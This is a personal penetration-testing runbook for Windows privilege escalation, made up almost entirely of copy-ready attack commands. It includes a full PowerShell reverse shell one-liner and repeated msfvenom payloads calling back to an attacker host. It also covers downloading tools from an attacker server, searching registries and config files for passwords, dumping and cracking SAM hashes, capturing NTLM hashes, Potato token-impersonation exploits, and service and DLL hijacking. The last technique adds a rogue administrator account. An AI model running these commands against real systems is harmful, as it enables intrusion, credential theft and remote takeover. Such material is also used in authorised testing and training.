# Windows privilege escalation
<!--- Status 80% --->

## Introduction

Updatw
This runbook is to help with information gathering.  It is set up to all be active gathering as all of the techniques interact with the given hosts.  Passive information gathering should be one prior as well.

- [Windows privilege escalation](#windows-privilege-escalation)
  - [Introduction](#introduction)
  - [Utilities](#utilities)
    - [Shell stabilization and interactivity](#shell-stabilization-and-interactivity)
    - [Useful reverse shells](#useful-reverse-shells)
    - [RDP connection](#rdp-connection)
    - [Port forwarding _(Plink)_](#port-forwarding-plink)
    - [Copy files from/to the target](#copy-files-fromto-the-target)
  - [Autoenumeration _(WinPEAS)_](#autoenumeration-winpeas)
  - [Autoenumeration _(SharpUp)_](#autoenumeration-sharpup)
  - [Autoenumeration _(Seatbelt)_](#autoenumeration-seatbelt)
  - [Effective permissions listing _(AccessChk)_](#effective-permissions-listing-accesschk)
  - [Processes monitoring _(ProcMon)_](#processes-monitoring-procmon)
  - [Windows exploit suggester](#windows-exploit-suggester)
  - [Manual enumeration](#manual-enumeration)
    - [System](#system)
    - [Users and groups](#users-and-groups)
    - [Apps, tasks, and services](#apps-tasks-and-services)
    - [Network](#network)
    - [Registries](#registries)
    - [Files and folders](#files-and-folders)
  - [Kernel exploits](#kernel-exploits)
  - [Permissions modification](#permissions-modification)
  - [Switching users in console](#switching-users-in-console)
  - [Catching Net-NTLMv2 hashes](#catching-net-ntlmv2-hashes)
  - [NBNS spoofing and NTLM relay _(HotPotato)_](#nbns-spoofing-and-ntlm-relay-hotpotato)
  - [Exploiting `AlwaysInstallElevated`](#exploiting-alwaysinstallelevated)
  - [Unquoted service path or service executable modification](#unquoted-service-path-or-service-executable-modification)
  - [Service binpath modification](#service-binpath-modification)
  - [Service registry modification](#service-registry-modification)
  - [DLL hijacking](#dll-hijacking)
  - [Parsing `SAM` and `SYSTEM` backups](#parsing-sam-and-system-backups)
  - [Using given privileges](#using-given-privileges)
  - [Token impersonation _(RoguePotato)_](#token-impersonation-roguepotato)
  - [Token impersonation _(PrintSpoofer)_](#token-impersonation-printspoofer)
  - [Token impersonation _(JuicyPotato)_](#token-impersonation-juicypotato)
  - [Token impersonation _(Incognito)_](#token-impersonation-incognito)
  - [Retrieving browser files _(SharpWeb)_](#retrieving-browser-files-sharpweb)
  - [Meterpreter's getsystem exploit](#meterpreters-getsystem-exploit)

## Utilities
### Shell stabilization and interactivity
- Listen to reverse shell:
```bash
rlwrap nc -lvnp 443
```

### Useful reverse shells
- Powershell oneliner:
```cmd
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- Base64 encoded powershell oneliner:
```bash

wget https://gist.githubusercontent.com/tothi/ab288fb523a4b32b51a53e542d40fe58/raw/40ade3fb5e3665b82310c08d36597123c2e75ab4/mkpsrevshell.py
python3 mkpsrevshell.py <ip> 443
```
- TCP reverse shell executable:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- Via SMB:
```bash
psexec.py '<username>:<password>@<ip>'
wmiexec.py '<username>:<password>@<ip>'
winexe -U '<username>%<password>' //<ip> cmd.exe
pth-winexe -U '<username>%<lm_hash>:<nt_hash>' //<ip> cmd.exe
```
- Via WinRM:
```bash
evil-winrm -i <ip> -u <username> -p <password>
evil-winrm -i <ip> -u <username> -H <nt_hash>
```

### RDP connection
```bash
xfreerdp +clipboard /w:1280 /h:720 /smart-sizing /cert:ignore /v:<ip> /u:<user> /p:'<password>'
```

### Port forwarding _(Plink)_
- Prepare:
```bash
cp ~/pentesting-tools/plink/plink64.exe ./plink.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Forward the blocked port:
```cmd
.\plink.exe root@<my_ip> -R <kali_port>:127.0.0.1:<port_to_forward>
```

### Copy files from/to the target
- SMB:
```bash
sudo smbserver.py -smb2support share .
```
```cmd
copy <filename> \\<ip>\share
copy \\<ip>\share\<filename> .
```
- SMB _(simply execute the file)_:
```bash
sudo smbserver.py -smb2support share .
```
```cmd
\\<ip>\share\<filename>
```
- SCP:
```bash
scp <username>@<ip>:<file_in_home_directory> .
scp <filename> <username>@<ip>:<path>
```
- FTP:
```bash
python3 -m pyftpdlib -w -p 2121
```
```cmd
ftp # anonymous user and empty password
open <ip> 2121
put <some_local_file>
```
- HTTP:
```bash
sudo python3 -m http.server 80
```
```cmd
certutil -urlcache -split -f "http://<my_ip>/<filename>" <filename>
powershell -c "(New-Object System.Net.WebClient).DownloadFile(\"http://<my_ip>/<filename>\", \"<filename>\")"
```

## Autoenumeration _(WinPEAS)_
- Prepare:
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -O ./winpeas.exe

cp ~/pentesting-tools/winpeas/winPEASany.exe ./winpeas.exe # Or my stored version
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
.\winpeas.exe
```

## Autoenumeration _(SharpUp)_
- Prepare:
```bash
cp ~/pentesting-tools/sharpup/SharpUp.exe ./sharpup.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
.\sharpup.exe
```

## Autoenumeration _(Seatbelt)_
- Prepare:
```bash
cp ~/pentesting-tools/seatbelt/Seatbelt.exe ./seatbelt.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
.\seatbelt.exe -group=all
```

## Effective permissions listing _(AccessChk)_
- Prepare:
```bash
cp ~/pentesting-tools/accesschk/accesschk.exe ./accesschk.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- List service permissions:
```cmd
.\accesschk.exe /accepteula -ucqv <service_name>
```
- List registry permissions:
```cmd
.\accesschk.exe /accepteula -uvwdk "<registry_path>"
```
- List file permissions:
```cmd
.\accesschk.exe /accepteula -quvw "C:\<file_path>"
```
- List directory permissions:
```cmd
.\accesschk.exe /accepteula -uwdq "C:\<directory_path>"
```

## Processes monitoring _(ProcMon)_
- Prepare:
```bash
cp ~/pentesting-tools/procmon/Procmon64.exe ./procmon.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run _(running as administrator required)_:
```
.\procmon.exe
```
- Search for a DLL not found by a system process:
```
Result is NAME NOT FOUND
User is NT AUTHORITY\SYSTEM
Path ends with dll
```

## Windows exploit suggester
- System info _(save output into the `systeminfo.txt` file on Kali)_:
```cmd
systeminfo
wmic qfe
```
- Run Exploit Suggester:
```bash
wes --update
wes systeminfo.txt --definitions ./definitions.zip -i "Elevation of Privilege" --exploits-only
```

## Manual enumeration
### System
- System info:
```cmd
systeminfo
wmic os
wmic os get osarchitecture
wmic qfe
powershell -c "Get-ComputerInfo"
powershell -c "[System.Environment]::OSVersion"
powershell -c "Get-Hotfix -description \"Security update\""
powershell -c "Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}"
```
- Environment variables:
```cmd
set
powershell -c "Get-ChildItem Env: | ft Key,Value"
```

### Users and groups
- Current user:
```cmd
whoami
echo %USERNAME%
powershell -c "$env:username"
net user %USERNAME%
whoami /priv
whoami /groups
```
- Other users:
```cmd
net user
powershell -c "Get-LocalUser | ft Name,Enabled,LastLogon"
```
- Groups:
```cmd
net localgroup
powershell -c "Get-LocalGroup | ft Name"
net localgroup Administrators
powershell -c "Get-LocalGroupMember Administrators | ft Name, PrincipalSource"
```
- Stored credentials:
```cmd
cmdkey /list
```

### Apps, tasks, and services
- List services:
```cmd
net start
wmic service list brief
sc query
powershell -c "Get-Service"
tasklist /SVC
```
- Get service info:
```cmd
sc qc <service>
sc query <service>
```
- List tasks:
```cmd
tasklist /v
tasklist /v /fi "username eq system"
tasklist /v | findstr /si "system admin"
powershell -c "Get-Process"
```
- List schedules tasks:
```cmd
schtasks /query /fo LIST 2>nul | findstr TaskName
powershell -c "Get-ScheduledTask"
powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike \"\Microsoft*\"}"
```
- List startup tasks:
```cmd
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```
- List installed programs:
```cmd
reg query "HKLM\SOFTWARE"
reg query "HKCU\SOFTWARE"
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
```

### Network
- General info:
```cmd
hostname
ipconfig
ipconfig /all
```
- List ports:
```cmd
netstat -ano
```
- List shares:
```cmd
net share
powershell -c "Find-DomainShare -ComputerDomain domain.local"
```

### Registries
- List registries:
```cmd
reg query "HKLM"
reg query "HKCU"
```
- `AlwaysInstallElevated` _(both should be set to 1 for the exploit to work)_:
```cmd
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer"
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer"
```
- Common registries with stored passwords:
```cmd
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```
- Search for passwords in registries _(too much output, better check registries known for storing passwords)_:
```cmd
reg query HKLM /f pass /t REG_SZ /s
reg query HKCU /f pass /t REG_SZ /s
reg query HKLM /f passwd /t REG_SZ /s
reg query HKCU /f passwd /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

### Files and folders
- List drives:
```cmd
wmic logicaldisk get caption,description,providername
powershell -c "Get-PSDrive | where {$_.Provider -like \"Microsoft.PowerShell.Core\FileSystem\"}| ft Name,Root"
powershell -c "Get-PSDrive -PsProvider FileSystem"
```
- File or directory permissions:
```cmd
icacls "C:\<path>"
```
- List files in common folders:
```cmd
dir /a C:\ 
dir /a "C:\Temp"
dir /a "C:\Users"
dir /a "C:\Users\%username%"
dir /a "C:\Users\%username%\Desktop"
dir /a "C:\Users\%username%\Downloads"
dir /a "C:\Users\%username%\Documents"
dir /a "C:\Users\%username%\AppData\"
dir /a "C:\Users\%username%\AppData\Local"
dir /a "C:\Users\%username%\AppData\LocalLow"
dir /a "C:\Users\%username%\AppData\Roaming"
dir /a "C:\Users\%username%\AppData\Local\Temp"
```
- Common files and registries having stored passwords:
```cmd
icacls %SYSTEMROOT%\repair\SAM
icacls %SYSTEMROOT%\System32\config\RegBack\SAM
icacls %SYSTEMROOT%\System32\config\SAM
icacls %SYSTEMROOT%\repair\system
icacls %SYSTEMROOT%\System32\config\SYSTEM
icacls %SYSTEMROOT%\System32\config\RegBack\system
```
- Search for files that often store passwords:
```cmd
dir /s/b "C:\*sysprep.inf" "C:\*sysprep.xml" "C:\*unattend.xml" "C:\*web.config" 2>nul
```
- Search for passwords in common config files:
```cmd
powershell -c "Get-ChildItem -Path C:\ -Filter unattend.xml -Recurse -Depth 3 -ErrorAction SilentlyContinue |  Select-String -Pattern \"password\" -Context 3,3"
powershell -c "Get-ChildItem -Path C:\ -Filter sysprep -Recurse -Depth 3 -ErrorAction SilentlyContinue |  Select-String -Pattern \"password\" -Context 3,3"
powershell -c "Get-ChildItem -Path C:\ -Filter web.config -Recurse -ErrorAction SilentlyContinue |  Select-String -Pattern \"password\" -Context 3,3"
```
- Search for passwords in files in the current directory:
```cmd
findstr /spin password *.config *.xml *.ini *.txt 
```

## Kernel exploits
- List of precompiled Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits

## Permissions modification
- If the file or folder is owned by me, I can get all permissions for it:
```cmd
icacls "C:\<file_path>" /grant <user>:(F)
```

## Switching users in console
- Prepare the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
runas /user:<user> .\shell.exe
```
- Run with stored credentials _(or if password for user is not required)_:
```cmd
runas /savecred /user:<user> .\shell.exe
``` 

## Catching Net-NTLMv2 hashes
- Prepare the responder:
```bash
sudo responder -I tun0
```
- Connect to the share from target:
```cmd
//<my_ip>/share/anything
```
- Crack the hash:
```bash
echo '<hash>' > hash
hashcat -m 5600 -a 0 ./hash /usr/share/wordlists/rockyou.txt
```

## NBNS spoofing and NTLM relay _(HotPotato)_
- Prepare the exploit and the reverse shell:
```bash
cp ~/pentesting-tools/hotpotato/Potato.exe ./potato.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run it on Windows 7:
```cmd
.\potato.exe -ip <windows_ip> -disable_exhaust true -disable_defender true -cmd "<full_path>\shell.exe" 
```
- Run it on Windows Server 2008:
```cmd
.\potato.exe -ip <windows_ip> -disable_exhaust true -disable_defender true --spoof_host WPAD.EMC.LOCAL -cmd "<full_path>\shell.exe" 
```

## Exploiting `AlwaysInstallElevated`
- Prepare the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f msi > shell.msi
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
msiexec /quite /qn /i shell.msi
```

## Unquoted service path or service executable modification
- Prepare the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Stop/Start service:
```cmd
sc stop <service_name>
sc start <service_name>

net stop <service_name>
net start <service_name> 
```

## Service binpath modification
- Prepare the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Modify service binpath:
```cmd
sc config <service_name> binpath= "\"C:\Users\<username>\AppData\Local\Temp\shell.exe\""
```
- Stop/Start service
```cmd
sc stop <service_name>
sc start <service_name>

net stop <service_name>
net start <service_name> 
```

## Service registry modification
- Prepare the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Modify the registry:
```cmd
reg add "<registry_path>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Users\<username>\AppData\Local\Temp\shell.exe" /f
```
- Stop/Start service
```cmd
sc stop <service_name>
sc start <service_name>

net stop <service_name>
net start <service_name> 
```

## DLL hijacking
- Prepare the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f dll -o shell.dll
```
- [Copy to the target](#copy-files-fromto-the-target) and put instead of the missing DLL.

## Parsing `SAM` and `SYSTEM` backups
- Run SMB server on Kali:
```bash
sudo smbserver.py share .
```
- Copy files from Windows target.
- Download `creddump7` in Kali:
```bash
cp -r ~/pentesting-tools/creddump7 ./creddump7
```
- Extract cached credentials:
```bash
# The output should look something like:
# admin:1004:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::
# where a9fdfa038c4b75ebc76dc855dd74f0da is the password hash
python2 ./creddump7/pwdump.py ./SYSTEM ./SAM
```
- Crack the hash _(or you can run `pth-winexe` or `evil-winrm` shell using hash only)_:
```bash
hashcat -m 1000 --force <pass_hash> /usr/share/wordlists/rockyou.txt
```

## Using given privileges
- `SeBackupPrivilege` grants read access to all files regardless of their ACL.
- `SeRestorePrivilege` grants write access to all files regardless of their ACL.
- `SeTakeOwnershipPrivilege` allows to take the ownership of files. Give user full permissions to the file/folder:
```cmd
icacls "<folder_or_file_path>" /q /c /t /grant <username>:F
```

## Token impersonation _(RoguePotato)_
- Works with  `SeImpersonatePrivilege` or/and `SeAssignPrimaryTokenPrivilege` enabled.
- Prepare the exploit and the reverse shell:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
cp ~/pentesting-tools/roguepotato/RoguePotato.exe ./roguepotato.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run socat port redirection on Kali _(choose another port if 9999 is in use on the target)_:
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<target_ip>:9999
```
- Run exploit:
```cmd
.\roguepotato.exe -r <my_ip> -l 9999 -e .\shell.exe
```

## Token impersonation _(PrintSpoofer)_
- Works with  `SeImpersonatePrivilege` enabled.
- Prepare:
```bash
cp ~/pentesting-tools/printspoofer/PrintSpoofer64.exe ./printspoofer.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
.\printspoofer.exe -i -c powershell.exe
```

## Token impersonation _(JuicyPotato)_
- Works with  `SeImpersonatePrivilege` or/and `SeAssignPrimaryTokenPrivilege` enabled _(use RoguePotato or PrintSpoofer on the latest Windows versions)_.
- Prepare:
```bash
cp ~/pentesting-tools/juicypotato/JuicyPotato.exe ./juicypotato.exe
cp ~/pentesting-tools/juicypotato/JuicyPotato86.exe ./juicypotato.exe # X86 version

msfvenom -p windows/shell_reverse_tcp LHOST=<my_ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Choose CLSID _(https://github.com/ohpe/juicy-potato/tree/master/CLSID)_.
- Run:
```cmd
.\juicypotato.exe -l 1337 -p .\shell.exe -t * -c <clsid>
```

## Token impersonation _(Incognito)_
- Works with  `SeImpersonatePrivilege` and `SeDebugPrivilege` enabled _(use RoguePotato or PrintSpoofer on the latest Windows versions)_.
- Prepare:
```bash
cp ~/pentesting-tools/incognito/incognito.exe ./incognito.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Add privesc user with admin rights:
```cmd
.\incognito.exe add_user privesc 123456
.\incognito.exe add_localgroup_user Administrators privesc
```

## Retrieving browser files _(SharpWeb)_
- Prepare:
```bash
cp ~/pentesting-tools/sharpweb/SharpWeb.exe ./sharpweb.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Run:
```cmd
.\sharpweb.exe all
```

## Meterpreter's getsystem exploit
- This tool requires your user to be a local admin or to have `SeDebugPrivilege` _(x86 only)_.
- Prepare the meterpreter shell:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=443 -f exe > shell.exe
```
- [Copy to the target](#copy-files-fromto-the-target)
- Listen to the reverse shell:
```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost <ip>
set lport 443
run
```
- Run shell:
```cmd
.\shell.exe
```
- Privesc using metasploit:
```bash
use priv
getsystem
```
